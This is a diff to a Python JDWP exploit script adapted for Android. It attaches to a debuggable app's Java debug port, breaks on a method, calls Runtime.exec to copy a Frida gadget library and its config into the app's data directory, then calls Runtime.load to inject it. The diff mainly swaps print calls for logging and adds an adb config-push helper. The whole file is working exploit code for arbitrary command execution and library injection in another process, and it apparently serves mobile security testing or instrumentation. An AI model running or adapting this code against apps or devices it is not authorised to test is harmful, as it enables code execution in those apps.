@@ -6,6 +6,9 @@
 #
 
 import logging
+import os
+import tempfile
+import json
 import socket
 import subprocess
 import time
@@ -73,7 +76,7 @@ TYPE_CLASS                = 1
 #
 class JDWPClient:
 
-    def __init__(self, host, port=8000):
+    def __init__(self, host="127.0.0.1", port=8700):
         self.host = host
         self.port = port
         self.methods = {}
@@ -108,7 +111,7 @@ class JDWPClient:
             if len(data):
                 buf += data
             else:
-                print("[!] read_reply: empty recv, connection may be closing")
+                logging.info("[!] read_reply: empty recv, connection may be closing")
                 time.sleep(1)
         return buf
 
@@ -152,7 +155,7 @@ class JDWPClient:
                         buf = struct.unpack(">I", buf[index+5:index+9])
                         index = 0
                 else:
-                    print("Error")
+                    logging.info("Error")
                     sys.exit(1)
 
             entries.append(data)
@@ -177,7 +180,9 @@ class JDWPClient:
         return
 
     def start(self):
+        logging.info("[*] Starting JDWP handshake...")
         self.handshake(self.host, self.port)
+        logging.info("[*] Handshake successful, retrieving VM information...")
         self.idsizes()
         self.getversion()
         self.allclasses()
@@ -445,36 +450,36 @@ class JDWPClient:
 
 
 def runtime_exec(jdwp, args):
-    print("[+] Targeting '%s:%d'" % (args.target, args.port))
-    print("[+] Reading settings for '%s'" % jdwp.version)
+    logging.info("[+] Targeting '%s:%d'" % (args.target, args.port))
+    logging.info("[+] Reading settings for '%s'" % jdwp.version)
 
     # 1. get Runtime class reference
     runtimeClass = jdwp.get_class_by_name("Ljava/lang/Runtime;")
     if runtimeClass is None:
-        print("[-] Cannot find class Runtime")
+        logging.info("[-] Cannot find class Runtime")
         return False
-    print("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])
+    logging.info("[+] Found Runtime class: id=%x" % runtimeClass["refTypeId"])
 
     # 2. get getRuntime() meth reference
     jdwp.get_methods(runtimeClass["refTypeId"])
     getRuntimeMeth = jdwp.get_method_by_name("getRuntime")
     if getRuntimeMeth is None:
-        print("[-] Cannot find method Runtime.getRuntime()")
+        logging.info("[-] Cannot find method Runtime.getRuntime()")
         return False
-    print("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
+    logging.info("[+] Found Runtime.getRuntime(): id=%x" % getRuntimeMeth["methodId"])
 
     # 3. setup breakpoint on frequently called method
     c = jdwp.get_class_by_name(args.break_on_class)
     if c is None:
-        print("[-] Could not access class '%s'" % args.break_on_class)
-        print("[-] It is possible that this class is not used by application")
-        print("[-] Test with another one with option `--break-on`")
+        logging.info("[-] Could not access class '%s'" % args.break_on_class)
+        logging.info("[-] It is possible that this class is not used by application")
+        logging.info("[-] Test with another one with option `--break-on`")
         return False
 
     jdwp.get_methods(c["refTypeId"])
     m = jdwp.get_method_by_name(args.break_on_method)
     if m is None:
-        print("[-] Could not access method '%s'" % args.break_on)
+        logging.info("[-] Could not access method '%s'" % args.break_on)
         return False
 
     # bytes([]) instead of chr()
@@ -484,25 +489,25 @@ def runtime_exec(jdwp, args):
     loc += struct.pack(">II", 0, 0)
     data = [(MODKIND_LOCATIONONLY, loc)]
     rId = jdwp.send_event(EVENT_BREAKPOINT, *data)
-    print("[+] Created break event id=%x" % rId)
+    logging.info("[+] Created break event id=%x" % rId)
 
     # 4. resume vm and wait for event
     jdwp.resumevm()
 
-    print("[+] Waiting for an event on '%s'" % args.break_on)
+    logging.info("[+] Waiting for an event on '%s'" % args.break_on)
     attempt = 0
     while True:
         attempt += 1
-        print(f"[.] wait_for_event attempt #{attempt}...")
+        logging.info(f"[.] wait_for_event attempt #{attempt}...")
         buf = jdwp.wait_for_event()
-        print(f"[.] got event buf len={len(buf)}, checking breakpoint match...")
+        logging.info(f"[.] got event buf len={len(buf)}, checking breakpoint match...")
         ret = jdwp.parse_event_breakpoint(buf, rId)
         if ret is not None:
             break
-        print(f"[.] event did not match rId={rId}, waiting again...")
+        logging.info(f"[.] event did not match rId={rId}, waiting again...")
 
     rId, tId, loc = ret
-    print("[+] Received matching event from thread %#x" % tId)
+    logging.info("[+] Received matching event from thread %#x" % tId)
 
     time.sleep(1)
     jdwp.clear_event(EVENT_BREAKPOINT, rId)
@@ -513,28 +518,34 @@ def runtime_exec(jdwp, args):
     else:
         if hasattr(args, 'package_name') and args.package_name:
             packagename = args.package_name
-            print(f"Using package name from Frida: {packagename}")
+            logging.info(f"Using package name from Frida: {packagename}")
         else:
             packagename = getPackageName(jdwp, tId)
             if not packagename or packagename is False:
-                print("[-] Failed to get package name")
+                logging.info("[-] Failed to get package name")
                 return False
         tmpLocation = "/data/local/tmp/frida-gadget.so"
+        tmpConfigLocation = "/data/local/tmp/frida-gadget.config.so"
         dstLocation = "/data/data/" + packagename + "/frida-gadget.so"
+        dstConfigLocation = "/data/data/" + packagename + "/frida-gadget.config.so"
         command = "cp " + tmpLocation + " " + dstLocation
-        print("[*] Copying library from " + tmpLocation + " to " + dstLocation)
+        command_config = "cp " + tmpConfigLocation + " " + dstConfigLocation
+        logging.info("[*] Copying library from " + tmpLocation + " to " + dstLocation)
         runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command)
         time.sleep(2)
-        print("[*] Executing Runtime.load(" + dstLocation + ")")
+        logging.info("[*] Copying config from " + tmpConfigLocation + " to " + dstConfigLocation)
+        runtime_exec_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], command_config)
+        time.sleep(2)
+        logging.info("[*] Executing Runtime.load(" + dstLocation + ")")
         jdwp.socket.settimeout(120)
         runtime_load_payload(jdwp, tId, runtimeClass["refTypeId"], getRuntimeMeth["methodId"], dstLocation)
         jdwp.socket.settimeout(60)
         time.sleep(2)
-        print("[*] Library should now be loaded")
+        logging.info("[*] Library should now be loaded")
 
     jdwp.resumevm()
 
-    print("[!] Command successfully executed")
+    logging.info("[!] Command successfully executed")
 
     return True
 
@@ -576,19 +587,19 @@ def runtime_exec_info(jdwp, threadId):
 
     systemClass = jdwp.get_class_by_name("Ljava/lang/System;")
     if systemClass is None:
-        print("[-] Cannot find class java.lang.System")
+        logging.info("[-] Cannot find class java.lang.System")
         return False
 
     jdwp.get_methods(systemClass["refTypeId"])
     getPropertyMeth = jdwp.get_method_by_name("getProperty")
     if getPropertyMeth is None:
-        print("[-] Cannot find method System.getProperty()")
+        logging.info("[-] Cannot find method System.getProperty()")
         return False
 
     for propStr, propDesc in properties.items():  # .iteritems() → .items()
         propObjIds = jdwp.createstring(propStr)
         if len(propObjIds) == 0:
-            print("[-] Failed to allocate command")
+            logging.info("[-] Failed to allocate command")
             return False
         propObjId = propObjIds[0]["objId"]
 
@@ -600,11 +611,11 @@ def runtime_exec_info(jdwp, threadId):
                                 *data)
         # Python 3: buf[0] is int, compare directly with TAG_STRING
         if buf[0] != TAG_STRING:
-            print("[-] %s: Unexpected returned type: expecting String" % propStr)
+            logging.info("[-] %s: Unexpected returned type: expecting String" % propStr)
         else:
             retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
             res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, retId))
-            print("[+] Found %s '%s'" % (propDesc, res))
+            logging.info("[+] Found %s '%s'" % (propDesc, res))
 
     return True
 
@@ -614,45 +625,45 @@ def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, comma
     # This function will invoke command as a payload, which will be running
     # with JVM privilege on host (intrusive).
     #
-    print("[+] Selected payload '%s'" % command)
+    logging.info("[+] Selected payload '%s'" % command)
 
     # 1. allocating string containing our command to exec()
     cmdObjIds = jdwp.createstring(command)
     if len(cmdObjIds) == 0:
-        print("[-] Failed to allocate command")
+        logging.info("[-] Failed to allocate command")
         return False
     cmdObjId = cmdObjIds[0]["objId"]
-    print("[+] Command string object created id:%x" % cmdObjId)
+    logging.info("[+] Command string object created id:%x" % cmdObjId)
 
     # 2. use context to get Runtime object
     buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
     # Python 3: buf[0] is int
     if buf[0] != TAG_OBJECT:
-        print("[-] Unexpected returned type: expecting Object")
+        logging.info("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
 
     if rt is None:
-        print("[-] Failed to invoke Runtime.getRuntime()")
+        logging.info("[-] Failed to invoke Runtime.getRuntime()")
         return False
-    print("[+] Runtime.getRuntime() returned context id:%#x" % rt)
+    logging.info("[+] Runtime.getRuntime() returned context id:%#x" % rt)
 
     # 3. find exec() method
     execMeth = jdwp.get_method_by_name("exec")
     if execMeth is None:
-        print("[-] Cannot find method Runtime.exec()")
+        logging.info("[-] Cannot find method Runtime.exec()")
         return False
-    print("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])
+    logging.info("[+] found Runtime.exec(): id=%x" % execMeth["methodId"])
 
     # 4. call exec() in this context with the alloc-ed string
     data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
     buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth["methodId"], *data)
     if buf[0] != TAG_OBJECT:
-        print("[-] Unexpected returned type: expecting Object")
+        logging.info("[-] Unexpected returned type: expecting Object")
         return False
 
     retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
-    print("[+] Runtime.exec() successful, retId=%x" % retId)
+    logging.info("[+] Runtime.exec() successful, retId=%x" % retId)
 
     return True
 
@@ -663,12 +674,12 @@ def getPackageName(jdwp, threadId):
     #
     activityThreadClass = jdwp.get_class_by_name("Landroid/app/ActivityThread;")
     if activityThreadClass is None:
-        print("[-] Cannot find class android.app.ActivityThread")
+        logging.info("[-] Cannot find class android.app.ActivityThread")
         return False
 
     contextWrapperClass = jdwp.get_class_by_name("Landroid/content/ContextWrapper;")
     if contextWrapperClass is None:
-        print("[-] Cannot find class android.content.ContextWrapper")
+        logging.info("[-] Cannot find class android.content.ContextWrapper")
         return False
 
     jdwp.get_methods(activityThreadClass["refTypeId"])
@@ -676,33 +687,33 @@ def getPackageName(jdwp, threadId):
 
     getContextMeth = jdwp.get_method_by_name("currentApplication")
     if getContextMeth is None:
-        print("[-] Cannot find method ActivityThread.currentApplication()")
+        logging.info("[-] Cannot find method ActivityThread.currentApplication()")
         return False
 
     buf = jdwp.invokestatic(
         activityThreadClass["refTypeId"], threadId, getContextMeth["methodId"])
     if buf[0] != TAG_OBJECT:
-        print("[-] Unexpected returned type: expecting Object")
+        logging.info("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
     if rt is None:
-        print("[-] Failed to invoke ActivityThread.currentApplication()")
+        logging.info("[-] Failed to invoke ActivityThread.currentApplication()")
         return False
 
     # 3. find getPackageName() method
     getPackageNameMeth = jdwp.get_method_by_name("getPackageName")
     if getPackageNameMeth is None:
-        print("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
+        logging.info("[-] Cannot find method ActivityThread.currentApplication().getPackageName()")
         return False
 
     # 4. call getPackageNameMeth()
     buf = jdwp.invoke(rt, threadId, contextWrapperClass["refTypeId"], getPackageNameMeth["methodId"])
     if buf[0] != TAG_STRING:
-        print("[-] Unexpected returned type: expecting String")
+        logging.info("[-] Unexpected returned type: expecting String")
     else:
         retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
         res = jdwp.solve_string(jdwp.format(jdwp.objectIDSize, retId))
-        print("[+] getPackageMethod(): '%s'" % res)
+        logging.info("[+] getPackageMethod(): '%s'" % res)
 
     return "%s" % res
 
@@ -715,34 +726,70 @@ def runtime_load_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, libra
     # 1. allocating string containing our library path
     cmdObjIds = jdwp.createstring(library)
     if len(cmdObjIds) == 0:
-        print("[-] Failed to allocate library string")
+        logging.info("[-] Failed to allocate library string")
         return False
     cmdObjId = cmdObjIds[0]["objId"]
 
     # 2. use context to get Runtime object
     buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
     if buf[0] != TAG_OBJECT:
-        print("[-] Unexpected returned type: expecting Object")
+        logging.info("[-] Unexpected returned type: expecting Object")
         return False
     rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1 + jdwp.objectIDSize])
 
     if rt is None:
-        print("[-] Failed to invoke Runtime.getRuntime()")
+        logging.info("[-] Failed to invoke Runtime.getRuntime()")
         return False
 
     # 3. find load() method
     loadMeth = jdwp.get_method_by_name("load")
     if loadMeth is None:
-        print("[-] Cannot find method Runtime.load()")
+        logging.info("[-] Cannot find method Runtime.load()")
         return False
 
     # 4. call load() in this context with the alloc-ed string
     data = [bytes([TAG_OBJECT]) + jdwp.format(jdwp.objectIDSize, cmdObjId)]
     jdwp.invokeVoid(rt, threadId, runtimeClassId, loadMeth["methodId"], *data)
 
-    print("[+] Runtime.load(%s) probably successful" % library)
+    logging.info("[+] Runtime.load(%s) probably successful" % library)
 
     return True
+def _push_gadget_config(self, package_name):
+    logging.info("[*] Gerando frida-gadget.config.so...")
+    
+    # A configuração que força o Gadget a escutar na 27042
+    config_data = {
+        "interaction": {
+            "type": "listen",
+            "address": "127.0.0.1",
+            "port": 27042,
+            "on_port_conflict": "fail",
+            "on_load": "resume"
+        }
+    }
+    
+    # Cria um arquivo temporário localmente
+    with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.so') as tmp_config:
+        json.dump(config_data, tmp_config)
+        tmp_config_path = tmp_config.name
+
+    try:
+        adb_cmd = ["adb"]
+        if self.serial:
+            adb_cmd.extend(["-s", self.serial])
+            
+        target_tmp_path = "/data/local/tmp/frida-gadget.config.so"
+        
+        # Faz o push do config para a pasta temporária do Android
+        push_cmd = adb_cmd.copy() + ["push", tmp_config_path, target_tmp_path]
+        subprocess.run(push_cmd, check=True, capture_output=True)
+        
+        logging.info("[+] frida-gadget.config.so enviado para /data/local/tmp/")
+    except Exception as e:
+        logging.error(f"[-] Falha ao enviar o arquivo de configuração: {e}")
+    finally:
+        # Limpa o arquivo local do seu Mac/PC
+        os.remove(tmp_config_path)
 def _is_gadget_running(serial=None):
     adb_cmd = ["adb"]
     if serial:
@@ -754,41 +801,43 @@ def _is_gadget_running(serial=None):
         capture_output=True, text=True
     )
     return "127.0.0.1:27042" in result.stdout
-def run_jdwp(target, port, cmd=None, loadlib=None, break_on="android.os.Handler.dispatchMessage", package_name=None, serial=None):
+def run_jdwp(target, port, cmd=None, break_on="android.os.Handler.dispatchMessage", package_name=None, serial=None):
     classname, meth = str2fqclass(break_on)
 
     class Args:
         pass
     if _is_gadget_running(serial=serial):
-                print("[*] Detected Frida gadget running on device, will attempt to use it for library injection")
+                logging.info("[*] Detected Frida gadget running on device, will attempt to use it for library injection")
                 return {"status": "gadget_detected"}
 
     args = Args()
     args.target = target
     args.port = port
     args.cmd = cmd
-    args.loadlib = loadlib
+    args.loadlib = os.path.expanduser("~/.cache/idk/frida-gadget.so")
     args.break_on = break_on
     args.break_on_class = classname
     args.break_on_method = meth
     args.package_name = package_name
+    # args to string
+    logging.info(f"[*] Running JDWP client with args: {args.__dict__}")
 
     cli = JDWPClient(target, port)
     try:
-        print("run_jdwp: connecting + handshake...")
+        logging.info("run_jdwp: connecting + handshake...")
         cli.handshake(target, port)
-        print("run_jdwp: handshake OK")
+        logging.info("run_jdwp: handshake OK")
 
         cli.idsizes()
-        print("run_jdwp: idsizes OK")
+        logging.info("run_jdwp: idsizes OK")
 
         cli.getversion()
-        print("run_jdwp: getversion OK — %s" % cli.version)
+        logging.info("run_jdwp: getversion OK — %s" % cli.version)
 
         cli.allclasses()
-        print("run_jdwp: allclasses OK — %d classes loaded" % len(cli.classes))
+        logging.info("run_jdwp: allclasses OK — %d classes loaded" % len(cli.classes))
 
-        print("run_jdwp: calling runtime_exec...")
+        logging.info("run_jdwp: calling runtime_exec...")
         success = runtime_exec(cli, args)
         return {"status": "completed" if success else "failed"}
     
@@ -803,7 +852,7 @@ def run_jdwp(target, port, cmd=None, loadlib=None, break_on="android.os.Handler.
 def str2fqclass(s):
     i = s.rfind('.')
     if i == -1:
-        print("[-] Cannot parse path")
+        logging.info("[-] Cannot parse path")
         sys.exit(1)
 
     method = s[i:][1:]
@@ -816,19 +865,19 @@ if __name__ == "__main__":
         formatter_class=argparse.ArgumentDefaultsHelpFormatter)
 
     parser.add_argument("-t", "--target", type=str, metavar="IP",
-                        help="Remote target IP", required=True)
+                        help="Remote target IP", default="127.0.0.1")
     parser.add_argument("-p", "--port", type=int, metavar="PORT",
-                        default=8000, help="Remote target port")
+                        default=8700, help="Remote target port")
     parser.add_argument("--break-on", dest="break_on", type=str, metavar="JAVA_METHOD",
                         default="android.os.Handler.dispatchMessage",
                         help="Specify full path to method to break on")
     parser.add_argument("--cmd", dest="cmd", type=str, metavar="COMMAND",
                         help="Specify command to execute remotely")
     parser.add_argument("--loadlib", dest="loadlib", type=str, metavar="LIBRARYNAME",
-                        help="Specify library to inject into process load")
+                        help="Specify library to inject into process load", default=os.path.expanduser("~/.cache/idk/frida-gadget.so"))
 
     args = parser.parse_args()
-
+    logging.info(f"[*] Using args: {args}")
     classname, meth = str2fqclass(args.break_on)
     setattr(args, "break_on_class", classname)
     setattr(args, "break_on_method", meth)
@@ -837,17 +886,18 @@ if __name__ == "__main__":
 
     try:
         cli = JDWPClient(args.target, args.port)
+        logging.info("[*] Starting JDWP client...")
         cli.start()
 
         if runtime_exec(cli, args) == False:
-            print("[-] Exploit failed")
+            logging.info("[-] Exploit failed")
             retcode = 1
 
     except KeyboardInterrupt:
-        print("[+] Exiting on user's request")
+        logging.info("[+] Exiting on user's request")
 
     except Exception as e:
-        print("[-] Exception: %s" % e)
+        logging.info("[-] Exception: %s" % e)
         traceback.print_exc()
         retcode = 1
         cli = None
